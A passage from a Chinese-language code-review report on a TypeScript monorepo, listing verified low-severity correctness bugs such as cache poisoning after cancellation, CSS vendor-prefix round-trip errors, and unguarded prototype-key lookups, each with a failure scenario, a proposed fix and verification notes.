**详情**: `executeDeterministicTestServerFunction` 会在尚不知道结果是成功值还是拒绝之前,就把 `execute()` 返回的*Promise* 为每次 mutation 存入 `testReplayByInvocation`。当 `options.signal` 被中止时,`execute()` 会以 `SVR_CANCELLED` 拒绝(第 442 和 457 行,以及 `waitForTestFixture`)。此后任何使用相同 `invocationId` 的调用都会在第 435-439 行短路,返回被缓存的已拒绝 Promise,因此一次被取消的尝试会永久毒化该调用键 —— 即便调用方用一个全新的、未被中止的 `AbortSignal` 重试也是如此;而 `assertInvocation` 明确支持 1..10 的 `attempt` 值,说明重试本就是设计中的调用模式。另外,该映射既没有大小上限也没有淘汰机制(不同于数据运行时中上限为 1000 的 `cacheEntries`),因此每一次 mutation 调用的结果都会被永久保留。

**失败场景**: 调用方以 `{ invocationId: 'inv-1', attempt: 1, signal }` 发起一次路由 action mutation,随后中止 `signal`(用户在请求中途离开页面)。被拒绝的 `SVR_CANCELLED` Promise 被存到 `inv-1` 下。调用方以 `{ invocationId: 'inv-1', attempt: 2, signal: freshController.signal }` 重试同一逻辑 mutation;`executeDeterministicTestServerFunction` 返回缓存的拒绝结果,fixture 永远不会被重新执行,因此该重试永远无法成功。在长时间会话中,该映射还会无界增长,为每次 mutation 调用永久保留一条冻结条目(fingerprint + 结果)。

**修复建议**: 只记忆化成功的结果:`const result = execute(); if (definition.effect === 'mutation') { testReplayByInvocation.set(invocationId, Object.freeze({ fingerprint, result })); result.catch(() => { if (testReplayByInvocation.get(invocationId)?.result === result) testReplayByInvocation.delete(invocationId); }); }`,并参照数据运行时的 `while (cacheEntries.size > 1000)` 添加有界的淘汰循环。

**验证备注**: 证据完全吻合(packages/prodivix-compiler/src/react/standaloneServerRuntime.ts:473-476)。`const result = execute();` 捕获的是一个 pending 的 Promise,并在其落定之前就为每次 mutation 存入 `invocationId` 下。`execute()` 会在入口的中止检查处、`waitForTestFixture` 内部(onAbort -> reject)以及 await 之后的中止复查处抛出 `runtimeError('SVR_CANCELLED')`,因此中途中止会产生一个被永久缓存的已拒绝 Promise。`assertInvocation`(第 226-237 行)只拒绝*已经被中止*的 signal,因此带全新未中止 signal 和 `attempt: 2` 的重试能够通过,然后在第 435-439 行短路并返回缓存的拒绝结果。既有测试 'runs deterministic mutation fixtures with invocation-key replay fencing'(standaloneServerRuntime.test.ts:236-315)证明相同 invocationId 加 attempt 2 的重试是被设计并支持的模式,而取消后重试的场景没有任何测试覆盖。该映射是模块级作用域且没有淘汰。严重级别已下调:整条代码路径只在 `target.kind === 'deterministic-test'` 时才会生成(第 34 行:`const deterministicTest = target.kind === 'deterministic-test' && definitions.length > 0`);对于 `static-client` / `execution-parent-gateway` 导出,provision envelope 检查会在该映射被触及之前抛出 SVR_TEST_RUNTIME_DISABLED。因此它只会让确定性测试的可执行项目运行降级(runtime-core/src/executableProject.ts:551),从不影响生产导出或 canonical 数据,而无界映射也只存活于一次有界的测试运行期间。

##### L-C-11 受控 CSS 厂商前缀映射不是单射,因此往返转换会静默重命名字面量 PIR style 绑定

- **位置**: [`packages/prodivix-compiler/src/react/controlledCss.ts:107`](packages/prodivix-compiler/src/react/controlledCss.ts#L107)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-targets`

**详情**: 只要 style 名称仅仅是*以* `Webkit`/`Moz`/`ms`/`O` 开头,`toCssPropertyName` 就会剥离厂商前缀,并不要求其后的字符必须为大写;而 `fromCssPropertyName` 总是把第一段重新首字母大写。因此只要前缀后面的字符是小写,这两个函数的结果就不一致。`STYLE_NAME_PATTERN`(第 51 行)明确允许这类名称。受控 CSS 的 property 测试(`controlledCss.property.test.ts:9-12`)只生成首字母小写的 camelCase 名称和 `--custom` 名称,因此这种不对称性没有被测试覆盖。

**失败场景**: 某个 PIR 元素携带 `style: { Opacity: { kind: 'literal', value: 0.5 } }`。`projectPirDocumentToControlledCss` 输出 `-o-pacity: 0.5;`。通过 `parseControlledCssToPirDocument` 重新解析该 CSS 时,`fromCssPropertyName('-o-pacity') === 'OPacity'`,于是 `createControlledCodeEditPlan` 产生一条 PIR 更新命令,在作者什么都没有改动的情况下静默地把绑定从 `Opacity` 重命名为 `OPacity`(丢弃原有的键)。任何匹配 `^ms[a-z]` 或 `^O[a-z]` 的键都会发生同样的问题。

**修复建议**: 在把名称当作带厂商前缀处理之前,要求前缀之后必须是大写字母(例如 `/^Webkit[A-Z]/`、`/^Moz[A-Z]/`、`/^ms[A-Z]/`、`/^O[A-Z]/`),并在投影时增加断言 `fromCssPropertyName(toCssPropertyName(name)) === name`,不成立时发出 `bindingUnsupported`。扩展 property 测试中的 `styleName` arbitrary,使其覆盖带厂商前缀和大小写混合的名称。

**验证备注**: 引用与 controlledCss.ts:101-109 一致。我用一个临时的 vitest 文件针对真实导出端到端复现了该失败(现已删除):style 键 'Opacity' 投影为 '-o-pacity: 0.5;' 并重新解析为 'OPacity';'msabc' -> '-ms-abc' -> 'msAbc';'Mozx' -> 'MozX';'Webkitx' -> 'WebkitX';'opacity' 能正确往返。每个失败用例都返回 status 'ready' 且没有任何 issue。没有任何环节能阻止它:parseControlledCssToPirDocument 用以 fromCssPropertyName 为键的 Object.fromEntries(rule.declarations) 替换了全部字面量 style,丢弃了原始键;重命名后的键仍然满足 STYLE_NAME_PATTERN;validatePirDocument 不约束 style 键名(pirBindingValidator.ts:373 只是遍历它们);而第 641 行末尾的再投影是对已经被重命名的文档再次投影,因此它自洽。于是 createControlledCodeEditPlan(apps/web/src/editor/features/code/useCodeAuthoringSession.ts:206)会发出一条静默重命名绑定的 PIR 更新。审查者有一处细节不准确:property 测试的生成器 ^[a-z][a-zA-Z0-9]{0,12}$ 是**能**产生以 'ms' 开头的小写名称的,因此该用例位于已测试的取值域之内,只是逃过了固定种子 0x15_07_2026 —— 测试是弱,而不是取值域盲区。严重级别维持 low,因为触发条件要求 style 键匹配 ^ms[a-z] / ^O[a-z] / ^Moz[a-z] / ^Webkit[a-z],而真实的 CSS 属性不会产生这样的键。

##### L-C-12 mergeExportDependencies 以后者覆盖的方式静默解决冲突的包版本;其版本选择表达式是可证明的空操作

- **位置**: [`packages/prodivix-compiler/src/export/dependencyPlanner.ts:28`](packages/prodivix-compiler/src/export/dependencyPlanner.ts#L28)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-compiler-core`

**详情**: `pickDependency` 计算 `previous.version === next.version ? previous.version : next.version`,而这两个分支在唯一会彼此不同的情况下取值相同 —— 该表达式无条件等于 `next.version`,与前一行的 `...next` 展开已经产生的结果完全一致。这个三元表达式是死代码,它记录了一个本应实现却从未实现的冲突检查:两处贡献声明同一个包的不同版本时会被静默合并,既没有 `CompileDiagnostic`,也不会在 `bundle.diagnostics` 中留下记录。这与同层的策略实现不一致,后者*确实*会检测坐标冲突并抛出 `CODEGEN_POLICY_PACKAGE_CONFLICT`(core/codegenPolicy.ts:310-334、375-393)。`mergeExportDependencies` 的结果输入 `exportDependenciesToPackageFields`,后者写出导出的 `package.json`(reactVite.ts:78、vueVite.ts:67)。

**失败场景**: 某个插件 codegen 策略贡献 `{ name: 'react', version: '^18.3.0', kind: 'peerDependency' }`,而 react-vite 预设贡献 `{ name: 'react', version: '^19.2.0' }`。`mergeExportDependencies` 输出单条版本为 `^19.2.0`、kind 为 `dependency` 的条目,且没有任何诊断。导出的 `package.json` 会安装 React 19,插件的组件在导出应用中运行时失败,而导出包和 `.prodivix/export-manifest.json` 都不会记录曾解决过一次版本冲突。

**修复建议**: 删除这个空操作的三元表达式,并为 `mergeExportDependencies` 接入一个诊断收集器:当 `previous.version !== next.version` 时,发出一条 `severity: 'error'`(至少 `'warning'`)、`source: 'export'` 的 `CompileDiagnostic`,写明两个版本及其来源,与 `core/codegenPolicy.ts` 中的 `appendPackageConflict` 保持一致。

**验证备注**: 对语言层面的解读是正确的,我无法反驳。dependencyPlanner.ts:24-31 先展开 ...previous 再展开 ...next(因此 version 已经是 next.version),随后又重新赋值 `version: previous.version === next.version ? previous.version : next.version`。两个版本相等时两个分支得到同一个字符串;不相等时该表达式得到 next.version —— 在所有情况下都与展开结果相同。它是可证明的空操作,即一段替代了从未编写的冲突检查的死代码。“没有诊断”这一半同样成立:mergeExportDependencies 返回合并后的列表,根本没有 CompileDiagnostic 通道,而同层守卫也未覆盖所述情形 —— collectPolicyPackages(core/codegenPolicy.ts:309-333)只是把取自 snapshot.libraries 和 snapshot.iconProviders 的坐标互相比较,因此 CODEGEN_POLICY_PACKAGE_CONFLICT 永远不可能针对“插件策略依赖 vs 预设脚手架依赖”触发。我还确认合并顺序使预设胜出:react/workspaceProject.ts:1328-1348 在插件派生的贡献之后追加 REACT_VITE_DEPENDENCIES,而 preferredKind 会把 peerDependency 提升为 dependency(rank 0 < 1),因此该场景的结果与描述完全一致,并且 plugin-contracts 中不存在保留包名校验。不过严重级别被抬高了。没有任何东西被破坏:Canonical Workspace 未被触及,这是一个读投影,而这里的后者覆盖最终选中的是预设自己的框架版本 —— 也就是脚手架、tsconfig 和 vite 插件实际所基于的版本,所以选中的值通常正是正确的那个。站得住脚的缺陷是一处冗余的死表达式,外加生成的 package.json 中缺少一条提示性诊断,而不是静默的数据丢失。

##### L-C-13 组件 prop 解析在索引 bindings 记录时缺少自有属性守卫,遇到继承键会抛出异常

- **位置**: [`packages/pir/src/projection/pirComponentProjection.ts:140`](packages/pir/src/projection/pirComponentProjection.ts#L140)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-pir`

**详情**: `resolvePirComponentPropValues` 遍历 `contract.propsById`,并用普通索引读取探测 `bindings[memberId]`。当契约成员 id 与 `Object.prototype` 的成员冲突时,即使实例没有声明任何绑定,真值检查也会因为继承来的值而通过,继承来的函数随后被传给 `resolvePirValueBinding`,其 `switch` 落入 `unreachableBinding` 并抛出异常。同级辅助函数 `pir-react-renderer/src/runtime/pirRenderScope.ts:109` 中的 `resolveRootContractValues` 做对了这一点(`Object.hasOwn(props, memberId) ? props[memberId] : member.defaultValue`),说明这里同样应当有该守卫。`resolvePirComponentVariantValues`(第 161 行)存在同样的无守卫读取,会静默地用继承值替代声明的 `defaultOptionId`。

**失败场景**: 某个 `pir-component` 文档声明 `componentContract.propsById = { toString: { id:'toString', name:'Label', typeRef:'string' } }`(这是合法的:`validateMemberIdentity` 只要求 key === member.id,并且没有任何规则禁止该名称)。某个页面以 `bindings.props = {}` 实例化它。在 `createPirComponentRuntimeInput` 期间,`bindings['toString']` 返回 `Object.prototype.toString`,于是 `resolvePirValueBinding` 收到一个 `.kind` 为 `undefined` 的函数,命中 `default` 分支,在渲染期间从 `useMemo` 内部抛出 `TypeError` 式的 `Error('Unsupported PIR-current value binding: undefined')` —— 整个投影崩溃,而不是回退到 `member.defaultValue`。

**修复建议**: 比照 `resolveRootContractValues`:使用 `Object.hasOwn(bindings, memberId) ? resolvePirValueBinding(bindings[memberId], ...) : member.defaultValue`,并在 `resolvePirComponentVariantValues` 中使用 `Object.hasOwn(bindings, memberId) ? bindings[memberId] : member.defaultOptionId`。

**验证备注**: 引用的代码与 pirComponentProjection.ts:138-147 完全一致,无守卫读取确实存在,审查者指出的不对称也是真实的:pir-react-renderer/src/runtime/pirRenderScope.ts:108/118 中的 resolveRootContractValues 对同一决策使用了 `Object.hasOwn(props, memberId)`。成员 id 不受任何约束 —— validateMemberIdentity(pirValidator.ts:153-175)只要求 key === member.id 且 name 非空,validatePropMap 只增加了 typeRef 非空的要求,validateComponentInstance(pirValidator.ts:732-742)只拒绝空的绑定键。因此 `contract.propsById.toString` 配合 `bindings.props = {}` 确实会从原型链上取到 `Object.prototype.toString`,而 projectPirValueBinding 落入 `default` -> unreachableBinding -> 抛出异常,位置在经由 createPirComponentRuntimeInput 进入的 useMemo 链内(pirRenderScope.ts:179)。第 161 行的 variant 读取同样没有守卫,会静默地用继承来的函数替代 defaultOptionId(编译器在 prodivix-compiler/src/react/nodeCompiler.ts:159 也会消费它)。不过严重级别必须下调:没有任何编写路径能产生这样的成员 id —— 契约编辑器用 nextId() 生成 id(apps/web/.../ContractPropertyEventSections.tsx:14-21、ContractSlotVariantSections.tsx:10),只会产生 `prop-N`/`event-N`/`slot-N`/`variant-N`,并且该 id 是只读展示的。这只有从手工构造、导入或 AI/插件产出的契约才可能触发,后果是渲染期抛出异常/一个错误的 variant 值,而不是持久化的数据损坏。Low。

##### L-C-14 环境绑定的 field 唯一性检查可被绕过,因为排序使用的是 localeCompare 而非码元顺序

- **位置**: [`packages/runtime-core/src/executionEnvironmentResolution.ts:313`](packages/runtime-core/src/executionEnvironmentResolution.ts#L313)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-runtime-core`

**详情**: `normalizeRequest` 用复合键 `${field}\0${bindingId}` 通过 `String.prototype.localeCompare` 对绑定请求排序,然后仅比较*相邻*条目来强制 `field` 的唯一性(第 324-330 行)。这种相邻性检查只有在排序把相同 `field` 的值聚在一起时才有效,而这要求码元顺序(或至少是尊重前缀的顺序)。ICU 根排序规则把 U+0000 视为完全可忽略的字符,因此复合键实际上按 `field+bindingId` 拼接后的形式参与排序,共享同一 `field` 的条目可能被另一个 `field` 是其前缀扩展的无关条目分隔开。我在本机上(Node,ICU 区域设置 zh-CN)通过实验验证了这一点:`('a'+NUL+'b').localeCompare('ab') === 0`,并且用 `localeCompare` 对 `['db\0x','dbx\0a','db\0y']` 排序得到 `db\0x | dbx\0a | db\0y`(重复项被拆开),而默认的码元排序得到 `db\0x | db\0y | dbx\0a`(重复项相邻)。这是在 Secret/环境解析边界上对一个校验不变量的失败放行,并且还依赖宿主:同一个请求可能在一种宿主区域设置下通过校验,而在另一种下被拒绝。

**失败场景**: 调用方以 `bindings: [{bindingId:'x', kind:'public', field:'db'}, {bindingId:'a', kind:'public', field:'dbx'}, {bindingId:'y', kind:'secret', field:'db'}]` 进行解析。经过 localeCompare 排序后顺序为 `db\0x`、`dbx\0a`、`db\0y`;相邻对扫描比较的是 'dbx' 与 'db'、'db' 与 'dbx',从来不会比较 'db' 与 'db'。重复的 `field: 'db'` 通过了校验,于是 `normalizeRequest` 返回的请求中,一个 public 绑定和一个 secret 绑定指向同一个注入 field。随后 `requestedBinding()` 会按需解析其中任意一个,消费方得到的正是该不变量本应禁止的歧义 field 映射(一个 secret 可能静默占据调用方以为是 public 的 field,反之亦然)。在码元顺序下,同样的输入会抛出 'Environment binding fields must be unique.'。

**修复建议**: 把比较器替换为确定性的码元比较(该包中已有 executableProjectNormalization.ts 里的 `compareExecutableProjectText` 正是为此而设),或者干脆放弃“排序再扫描”的做法,在排序之前用 `Set<string>` 对 `field` 强制唯一性。

**验证备注**: 引用的证据与 executionEnvironmentResolution.ts:313-317 和 324-330 逐字一致。我在本机(Node v26.3.0,区域设置 zh-CN,完整 ICU)复现了该排序行为:('a'+NUL+'b').localeCompare('ab') 返回 0,用 localeCompare 对 ['db\0x','dbx\0a','db\0y'] 排序得到 db\0x | dbx\0a | db\0y,而码元排序得到 db\0x | db\0y | dbx\0a。因此相邻对唯一性扫描确实不健全,可能漏掉重复的 field。但严重级别被大幅抬高。(1)生产不可达:唯一的生产端解析请求构造方是 packages/data/src/dataEnvironmentRuntime.ts:44-72,它把 field 推导为 `${owner}.${key}`,其中 owner 取自 {'source','operation'},key 取自一个 Record,因此结构上不可能出现重复 field;在整个仓库中 createExecutionEnvironmentResolutionService 只在测试中被实例化(git grep 显示为 dataHttpAdapter.test.ts、dataRuntime.test.ts、executionEnvironmentResolution.test.ts)。(2)所述后果并不能从代码推出:根本不存在 field->binding 映射。requestedBinding(第 519 行)按 bindingId && kind && field 匹配,kind 由入口点固定(readPublicBinding -> 'public',useSecret -> 'secret'),resolve 已经对照 snapshot 校验了每个绑定的 kind(428-445),而 normalizeSnapshot 禁止同一个 bindingId 同时为 public 和 secret(278-281)。secret 不可能占据调用方以为是 public 的 field。(3)“依赖宿主”的定性站不住脚:NUL 在 ICU 根排序规则中是完全可忽略的,因此该行为在各区域设置下是一致的,并不随区域设置变化。真实的潜在校验器缺陷,严重级别 low。

##### L-C-15 resolveColorValue 跟随主题 token 引用时没有环检测守卫,与其同类解析器不同,因此循环 manifest 会导致栈溢出而不是失败关闭

- **位置**: [`packages/themes/src/css/createCssVariables.ts:88`](packages/themes/src/css/createCssVariables.ts#L88)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-server-assets-tokens`

**详情**: `resolveColorValue` 在递归解析 `{token.path}` 引用时既没有 `visiting` 集合也没有深度上限,而针对同一 token 索引的另外两个解析器——`detectTokenCycles`(packages/themes/src/resolver/detectTokenCycles.ts:49)和 `resolveTokenValue`(packages/themes/src/resolver/resolveTokenReferences.ts:47)——都带有显式的环检测守卫并失败关闭。`createCssVariables` 和 `createThemeStyleText` 从包索引导出,且没有任何文档化的“manifest 必须先经过校验”的前置条件(packages/themes/src/index.ts:68-76),而 Storybook 的组合根直接调用 `createThemeStyleText` 却未调用 `validateThemeManifest`(packages/ui/.storybook/preview.tsx:50)。它还使用了裸 `tokens[referencePath]` 查找,而同类解析器使用 `Object.hasOwn`。

**失败场景**: 某个 manifest 设置了 `semantic.accent.default: '{semantic.accent.hover}'` 与 `semantic.accent.hover: '{semantic.accent.default}'`。在未先运行 `validateThemeManifest` 的情况下调用 `createCssVariables(manifest)`(或 `createThemeStyleText`),会为 `--accent-color` 进入 `resolveColorValue`,在两个 token 之间无限交替,并从投影调用中抛出 `RangeError: Maximum call stack size exceeded`——这是一次未处理的崩溃,而不是同类解析器所产生的 `ThemeTokenResolutionError` / 环检测诊断。

**修复建议**: 在 `resolveColorValue` 中传递一个 `visiting: Set<ThemeTokenPath>`(或一个小的深度计数器),在重入时返回 `undefined`,并使用 `Object.hasOwn(tokens, referencePath)` 进行查找,与 resolveTokenReferences.ts 保持一致。

**验证备注**: 代码事实正确:packages/themes/src/css/createCssVariables.ts:88-107 与引用原样吻合,resolveColorValue 递归解析 `{token.path}` 引用时既无 visiting 集合也无深度上限,而 detectTokenCycles(packages/themes/src/resolver/detectTokenCycles.ts:45-55,使用 visited/visiting 集合)与 resolveTokenValue(packages/themes/src/resolver/resolveTokenReferences.ts:43-51,使用 `resolving` 集合并抛出 ThemeTokenResolutionError)都失败关闭。该路径确实会被进入:'--accent-color' 匹配 supportsRgbChannelVariable 中的 '--accent-' 前缀,因此 addRgbChannelVariable 会调用 resolveColorValue。但该失败场景在任何真实流程中都不可达,这正是我大幅下调严重级别的原因。唯一的运行时入口是 applyThemeManifest(apps/web/src/theme/themeRuntime.ts:77-86),它会先调用 validateThemeManifest 并在任何错误时抛出;validateThemeManifest 在第 116 行运行 detectTokenCycles,并为每个环推入一条 'Circular theme token reference detected' 错误,因此循环 manifest 在那里永远到不了 createThemeStyleText。`git grep ThemeManifest` 在 packages/themes 之外只返回 themeRuntime.ts 和 packages/ui/.storybook/preview.tsx——而 preview.tsx:16-21 只喂入四个编译期的仓库内常量(officialMonochrome{Light,Dark}[HighContrast]Theme,背后是 packages/themes/manifests/official/*.json)。packages/themes/scripts/write-default-css.mjs 同样只传入静态的 defaultFallbackTheme。仓库中不存在任何插件、Workspace 或用户编写的主题 manifest 摄入路径,因此触发溢出的唯一方式是由假想的直接调用传入手工构造的循环 manifest。我还检查了次要的 `tokens[referencePath]` 与 Object.hasOwn 之争,结论是它无害:extractReferencePath 的正则(packages/themes/src/tokens/tokenPaths.ts:193)允许 'constructor'/'toString',但原型上的值是函数,因此第 102 行的 `typeof value !== 'string'` 会返回 undefined——不会递归,也不会崩溃。这是导出 API 中真实缺失的守卫;缺陷不可达,无数据风险。严重级别由 medium 修正为 low。

##### L-C-16 GraphQL 导入器用裸属性赋值构建 JSON Schema 的 `properties`,因此名为 **proto** 的变量或输入字段会破坏投影出的 schema

- **位置**: [`packages/data-graphql/src/dataGraphqlImporter.ts:596`](packages/data-graphql/src/dataGraphqlImporter.ts#L596)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: GraphQL 名称匹配 `[_A-Za-z][_0-9A-Za-z]*`,因此 `__proto__` 既是合法的变量名,也是合法的输入对象字段名。`properties[variable.variable.name.value] = …`(第 596 行)和 `inputTypeSchema` 内部的 `properties[field.name] = …`(第 328 行)都是向一个普通 `Record` 字面量赋值,因此 `__proto__` 键会静默地重新指定该记录的原型,而不是添加一个自有属性。同一文件在输出类型上已通过 `Object.fromEntries`(第 388 行)安全处理,展示了本应采用的模式。随后的 `Object.freeze(properties)` 嵌入了一个原型是 schema 对象的记录,而 `packages/data/src/dataDocument.ts:220` 中的 `cloneJsonValue` 会以 'JSON objects must be plain object records' 拒绝它。

**失败场景**: 针对匹配的 SDL 导入 `query Q($__proto__: String) { user { id } }`。`properties['__proto__'] = { anyOf: [{type:'string'},{type:'null'}] }` 设置了 `properties` 的原型;`Object.keys(properties)` 为空。因此投影出的输入 schema 静默丢失该变量,同时无法通过规范化校验;又因为 `normalizeDataSourceDocument` 未被保护(第 898 行),导入器直接抛错,而不是报告出问题的变量。

**修复建议**: 把 `[name, schema]` 对收集进数组,再用 `Object.fromEntries` 物化(正如 `outputTypeSchema` 在第 388 行已经做的),在 `compileProjection` 和 `inputTypeSchema` 中都这样处理。

**验证备注**: 证据吻合:dataGraphqlImporter.ts:596 在一个普通 `Record` 字面量上执行 `properties[variable.variable.name.value] = inputTypeSchema(...)`,而第 388 行的输出类型路径使用 Object.fromEntries。我用 graphql@16 验证了 `query Products($__proto__: String) { products(name: $__proto__) { id } }` 能通过 `validate()`(可执行变量名不受任何保留名规则约束;唯一的错误是变量未被使用时的 'never used',一旦使用即消失)。随后我在 packages/data-graphql 中通过 vitest 运行了真实导入器:createDataGraphqlImportProposal 抛出 `TypeError: Invalid data source document: /schemasById/products-input/schema/properties: JSON objects must be plain object records.` —— 与预测路径完全一致(dataDocument.ts:56 的 isPlainRecord 检查 getPrototypeOf,cloneJsonValue 在第 220 行拒绝,normalizeDataSourceDocument 在第 1986 行抛出,而第 898 行左右的调用未加保护)。关于第 328 行(名为 **proto** 的输入对象字段)的同类主张则不可达,因为 `validate()` 会调用 assertValidSchema,而 graphql 拒绝以 `__` 开头的类型系统名称;只有第 596 行的变量名路径是活跃的。严重级别下调为 low:该失败是失败关闭的(抛出异常,而非产生被损坏的持久化文档),需要刻意构造的恶意/病态变量名,而且 createDataGraphqlImportProposal 目前在包索引之外没有任何生产调用方——缺陷是缺少结构化 issue 加上一个未处理的抛出,而不是数据损坏。

##### L-C-17 GraphQL 适配器的 readPointer 会遍历原型链,把不存在的字段解析成 Object.prototype 上的内置成员

- **位置**: [`packages/data-graphql/src/dataGraphqlAdapter.ts:152`](packages/data-graphql/src/dataGraphqlAdapter.ts#L152)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: 该分区中其他所有 JSON Pointer 读取器都用 `Object.prototype.hasOwnProperty.call(...)` 限定对象遍历——dataHttpAdapter.ts:258、dataCacheRuntime.ts:225、dataDispatchRuntime.ts:285、dataOptimisticRuntime.ts:259——正是为了让缺失的键解析为 `undefined`。GraphQL 适配器的 `readPointer` 省略了该检查并直接索引对象,因此命名为 `Object.prototype` 成员的 token 会解析到继承来的内置值,而不是报告“未能解析”。GraphQL 导入器直接根据所选字段名生成 `resultPath`(`dataGraphqlImporter.ts:686`),而 `constructor`、`toString`、`valueOf` 和 `hasOwnProperty` 都是合法的 GraphQL 字段名。

**失败场景**: 某个导入的操作选择了一个字面名为 `constructor` 的根字段,因此 `resultPath` 为 `/constructor`。在 `partialErrorPolicy: 'allow-partial'` 下,服务端返回 `{"data":{},"errors":[…]}`。`readPointer(envelope.data, '/constructor')` 返回 `Object`(继承自 `Object.prototype`)而非 `undefined`,于是第 610 行的 `'GraphQL result path did not resolve.'` 守卫被绕过,适配器把一个函数作为 `value` 返回。随后 `executeDataOperation` 调用 `cloneDataJsonValue`,抛出 `TypeError: Data operation payload must be JSON-compatible.` —— 错误的报错,来自错误的层。

**修复建议**: 对齐 HTTP 适配器的写法:`else if (current !== null && typeof current === 'object' && Object.prototype.hasOwnProperty.call(current, token)) { current = (current as DataJsonObject)[token]; } else return undefined;`。

**验证备注**: 证据吻合;对象分支位于 dataGraphqlAdapter.ts:151-152,直接索引 `(current as DataJsonObject)[token]` 而无 hasOwnProperty 限定,与全都使用 Object.prototype.hasOwnProperty.call 的 dataHttpAdapter.ts:255-260、dataCacheRuntime.ts:224-226、dataDispatchRuntime.ts 和 dataOptimisticRuntime.ts 不同。cloneBoundedJson(第 208-213 行)用 Object.fromEntries 重建记录,因此被遍历的对象带有 Object.prototype,继承成员可见。`constructor` 是合法的 GraphQL 字段名(已验证:`validate()` 接受 `type Query { constructor: String }` + `query C { constructor }`,而 graphql-js 的 getFields() 使用空原型映射,该字段能正常解析),并且 dataGraphqlImporter.ts 直接根据所选字段名派生 resultPath。我以 resultPath '/constructor'、partialErrorPolicy 'allow-partial'、传输体 {"data":{},"errors":[{"message":"boom"}]} 通过 executeDataOperation 运行了真实适配器:第 610 行的守卫被绕过,调用以 `TypeError: Data operation payload must be JSON-compatible.` 失败,而不是 DATA_GRAPHQL_RESPONSE_INVALID / 'GraphQL result path did not resolve.' —— 与主张完全一致。严重级别下调为 low:它是失败关闭的(不会返回或持久化错误值,也不会泄露机密);唯一的真实损害是来自错误层的错误分类,而且它同时需要一个病态字段名和一个完全省略该键、不符合规范的部分响应(符合规范的服务端会把该键输出为 null,那样能正确解析)。

##### L-C-18 AsyncAPI 导入器的有界克隆会静默丢弃 **proto** 键,并可能返回一个 issues 为空的 'invalid' 提案

- **位置**: [`packages/data-asyncapi/src/dataAsyncApiImporter.ts:230`](packages/data-asyncapi/src/dataAsyncApiImporter.ts#L230)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-data`

**详情**: `cloneBounded` 用 `result[key] = cloned` 在一个普通对象字面量上累积克隆成员。名为 `__proto__` 的规范键会触发 `Object.prototype.__proto__` 的 setter:该值成为记录的原型而非自有属性,因此它从克隆结果中消失,也从 `digest(root)`(用于重新导入漂移检测的 `specificationDigest`)中消失。当受影响的记录是规范根时,第 863 行的 `isRecord(cloned)` 会因原型不再是 `Object.prototype` 而返回 false,`compileProjection` 被跳过,函数返回 `blocked('invalid', …)` 且 `issues` 数组为空——一次完全没有诊断的拒绝。同类的 OpenAPI 克隆(`dataOpenApiImporter.ts:293-304`)使用 `Object.fromEntries`,不受影响。

**失败场景**: 导入一个包含顶层 `"__proto__": {}` 成员(或某个厂商扩展对象中包含该成员)的 AsyncAPI 3.0 文档。`cloneBounded` 设置的是克隆结果的原型而不是该键;随后根对象无法通过 `isRecord`,`createDataAsyncApiImportProposal` 返回 `{ status: 'invalid', issues: [] }`,用户得不到任何失败原因。若 `__proto__` 键嵌套在两份在其他方面完全相同的规范中,二者会产生相同的 `specificationDigest`,因此对一个确实发生了变化的文档,重新导入会报告“上游无变化”。

**修复建议**: 累积 `[key, cloned]` 对并用 `Object.fromEntries` 构建记录,与 `dataOpenApiImporter.ts:293-304` 保持一致。另外,应在克隆结果不是记录时追加一条显式 issue,使 `blocked('invalid', …)` 不可能带着空 issue 列表出现。

**验证备注**: 证据与 dataAsyncApiImporter.ts:222-231 吻合;isRecord(第 118-125 行)确实会用 getPrototypeOf 与 Object.prototype/null 比对,因此所述链条成立,而 dataOpenApiImporter.ts:293-304 确实使用 Object.fromEntries 且不受影响。我在 packages/data-asyncapi 中用一个经 JSON.parse 的 AsyncAPI 3.0 文档运行了真实导入器(JSON.parse 会把 **proto** 创建为自有属性,已确认:Object.hasOwn(root,'**proto**') === true,Object.keys 中包含它)。结果:(a)顶层 "**proto**":{"x":1} -> createDataAsyncApiImportProposal 返回 {status:'invalid', issues:[]} —— 一次零诊断的拒绝,与主张完全一致;(b)在 /info 内嵌套 "**proto**" -> 状态为 'ready',sourceDigest 为 sha256-c3fda8f3...,与干净规范的摘要完全相同,因此 specificationDigest(第 715 行)对该变化视而不见,重新导入会报告没有上游漂移。主张的两部分均可复现。严重级别下调为 low:两条路径都要求上游规范中出现 **proto** 成员;根部情形失败关闭(不会产生损坏的文档,只是给出一次无解释的拒绝),嵌套情形削弱的是重新导入的漂移检测,而非破坏 Canonical Workspace 状态。

##### L-C-19 着色器编译诊断在任何 CRLF artifact 上都会丢失源码 span

- **位置**: [`packages/code-language/src/shader/shaderCompileCapabilityProvider.ts:82`](packages/code-language/src/shader/shaderCompileCapabilityProvider.ts#L82)
- **类别**: correctness ｜ **严重度**: Low ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-authoring-lang`

**详情**: `resolveMessageOffsets` 用 `artifact.source.indexOf('\n', lineStart)` 计算行尾,因此在 CRLF 源码上 `lineEnd` 是 `\n` 的下标,而 `source[lineEnd - 1]` 是 `\r`。被钳制的 `from`(第 75 行)和 `to`(第 82 行)都可能正好落在 `lineEnd` 上。`createCodeSourceSpanFromOffsets` 有意拒绝任何会拆开 CRLF 对的偏移(`packages/authoring/src/language/codeSourceSpan.ts:13-17`),因此它返回 `null`,`normalizeMessage`(第 90-96 行)也就完全省略了 `sourceSpan`。由此产生的 COD-5002 诊断没有 `sourceSpan`,这同时会因 `hasRequirement('sourceSpan', ...)` 为 false 而禁用 `open-source` 动作。

